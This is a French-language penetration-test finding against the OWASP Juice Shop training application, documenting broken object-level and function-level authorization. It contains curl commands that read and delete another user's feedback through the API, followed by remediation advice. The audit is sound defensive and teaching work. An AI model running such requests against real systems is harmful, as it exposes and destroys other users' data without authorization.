# AUD-004 - Analyse des mécanismes d'autorisation

## Informations

Date : 12/06/2026

Auditeur : Equipe Audit

Cible : OWASP Juice Shop

URL :
http://10.10.10.2:3000


# Objectif

Déterminer si les ressources exposées par l'API sont correctement protégées par des contrôles d'autorisation.

L'objectif est de vérifier qu'un utilisateur authentifié ne puisse pas :

- accéder aux ressources d'autres utilisateurs ;
- modifier des ressources qui ne lui appartiennent pas ;
- supprimer des ressources sans privilège suffisant.


# Méthodologie

Après création d'un compte standard :

audit@securebank.local

un JWT valide a été récupéré.

Les tests ont été réalisés via curl.


# Test 1 - Consultation de la collection Feedbacks

Commande :

curl -s \
-H "Authorization: Bearer <JWT>" \
http://10.10.10.2:3000/api/Feedbacks

Résultat :

HTTP 200 OK

Retour d'une liste complète des feedbacks.

Observations :

- présence de plusieurs UserId
- accès à des objets appartenant à d'autres utilisateurs

Interprétation :

Première indication d'un contrôle d'accès insuffisant.


# Test 2 - Consultation d'un objet spécifique

Commande :

curl -s \
-H "Authorization: Bearer <JWT>" \
http://10.10.10.2:3000/api/Feedbacks/1

Résultat :

{
    "UserId":1,
    "id":1,
    ...
}

Observations :

L'utilisateur authentifié possède l'identifiant :

UserId = 24

La ressource consultée appartient à :

UserId = 1

Aucun contrôle n'empêche l'accès.

Interprétation :

Suspicion de BOLA.

OWASP API Top 10 :

API1:2023 Broken Object Level Authorization


# Test 3 - Suppression d'une ressource

Commande :

curl -i -X DELETE \
-H "Authorization: Bearer <JWT>" \
http://10.10.10.2:3000/api/Feedbacks/1

Résultat :

HTTP/1.1 200 OK

{
    "status":"success",
    "data":{}
}

Validation :

Nouvelle consultation de la collection :

curl -s \
-H "Authorization: Bearer <JWT>" \
http://10.10.10.2:3000/api/Feedbacks

Le feedback n°1 n'est plus présent.

Observations :

Suppression effective d'une ressource appartenant à un autre utilisateur.

Interprétation :

Contrôle d'autorisation absent ou insuffisant.

OWASP API Top 10 :

API5:2023 Broken Function Level Authorization


# Vulnérabilités identifiées

- VULN-001-BOLA
- VULN-002-BFLA


# Risque

Impact : élevé

Un utilisateur standard peut :

- consulter des données tierces ;
- supprimer des données tierces ;
- compromettre l'intégrité applicative.


# Recommandations

Vérifier systématiquement :

resource.owner_id == authenticated_user.id

Implémenter un middleware d'autorisation centralisé.

Appliquer le principe du moindre privilège.


# Statut

Confirmé